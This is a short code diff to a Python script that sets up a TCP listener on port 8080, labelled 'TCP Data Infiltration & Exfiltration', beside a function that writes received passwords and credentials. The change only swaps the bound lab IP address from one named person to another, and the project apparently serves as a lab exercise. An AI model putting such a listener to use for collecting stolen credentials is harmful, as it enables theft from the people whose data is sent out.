@@ -75,7 +75,8 @@ def writePasswords(conn, credentials):
 def connect():
     s = socket.socket()
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind(("192.168.21.128", 8080))  # Change the IP Address to fit your script
+    # s.bind(("192.168.21.128", 8080))  # Change the IP Address to fit your script LEIGHTON IP
+    s.bind(("192.168.20.1", 8080))  # Change the IP Address to fit your script QUINN IP
     s.listen(1)
     print("=" * 60)
     print("TCP Data Infiltration & Exfiltration")
